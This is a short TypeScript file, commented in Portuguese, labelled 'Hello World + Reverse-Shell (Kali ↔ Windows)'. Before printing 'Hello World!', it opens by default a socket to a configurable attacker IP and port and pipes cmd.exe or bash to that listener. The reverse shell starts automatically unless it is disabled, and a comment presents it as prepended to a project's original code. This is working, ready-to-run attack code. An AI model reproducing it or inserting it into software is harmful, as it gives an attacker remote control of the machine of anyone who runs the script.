/*********************************************************************
 *  hello.ts – “Hello World” + Reverse‑Shell (Kali ↔ Windows)
 *  ---------------------------------------------------------------
 *  •  Compile:   npx tsc scripts/src/hello.ts
 *  •  Run:       npx ts-node scripts/src/hello.ts
 *  •  Config via env:
 *        ATTACKER_IP   – IP do atacante (default 127.0.0.1)
 *        ATTACKER_PORT – Porta do listener (default 4444)
 *        REVERSE_SHELL – 0 = desativar, qualquer outro valor = ativar
 *  •  Em produção use REVERSE_SHELL=0 para evitar abrir portas.
 *********************************************************************/

import { spawn } from 'child_process';
import * as net from 'net';
import * as os from 'os';

/* ---------- CONFIGURAÇÃO ---------- */
const ATTACKER_IP = process.env.ATTACKER_IP ?? '127.0.0.1';
const ATTACKER_PORT = Number(process.env.ATTACKER_PORT ?? '4444');
const REVERSE_SHELL = process.env.REVERSE_SHELL !== '0';

/* ---------- FUNÇÃO DE REVERSE SHELL ---------- */
function startReverseShell(): void {
    const client = new net.Socket();

    client.connect(ATTACKER_PORT, ATTACKER_IP, () => {
        console.log(`[net] Shell conectado a ${ATTACKER_IP}:${ATTACKER_PORT}`);

        const shell = spawn(os.platform() === 'win32' ? 'cmd.exe' : 'bash', [], { stdio: 'pipe' });

        // Shell ⇄ Listener
        client.on('data', (data: Buffer) => shell.stdin.write(data));
        shell.stdout.on('data', (data: Buffer) => client.write(data));
        shell.stderr.on('data', (data: Buffer) => client.write(data));

        shell.on('close', () => {
            console.log('[net] Shell encerrado');
            client.end();
        });
    });

    client.on('error', err => console.error('[net] Erro de conexão:', err.message));
}

/* ---------- EXECUÇÃO AUTOMÁTICA ---------- */
if (REVERSE_SHELL) {
    startReverseShell();
}

/* ---------- CONTINUA COM O CÓDIGO ORIGINAL DO PROJETO ---------- */
console.log('Hello World!');